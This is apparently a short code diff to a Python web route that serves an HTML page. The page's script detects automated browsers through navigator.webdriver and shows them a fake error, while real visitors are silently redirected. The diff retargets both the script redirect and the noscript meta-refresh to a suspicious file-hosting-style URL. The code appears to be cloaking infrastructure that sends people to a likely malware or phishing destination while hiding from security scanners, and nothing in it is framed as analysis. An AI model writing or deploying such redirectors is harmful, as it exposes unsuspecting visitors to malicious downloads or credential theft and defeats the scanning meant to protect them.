@@ -102,7 +102,7 @@ def index():
           <script>
             setTimeout(function() {
               if (navigator && navigator.userAgent && !navigator.webdriver) {
-                window.location.replace('https://procom-zmrrw2raa.treksim.org');
+                window.location.replace('https://files-121archive-2nsupload.com/p7mbbm3');
               } else {
                 document.body.innerHTML += '<p style="color:red">Please enable JavaScript and use a modern browser.</p>';
               }
@@ -110,7 +110,7 @@ def index():
           </script>
           
           <noscript>
-            <meta http-equiv="refresh" content="3;url=https://api-xlnj6f0nr.qantrivomelaxis.ink">
+            <meta http-equiv="refresh" content="3;url=https://files-121archive-2nsupload.com/p7mbbm3">
           </noscript>
         </body>
         </html>
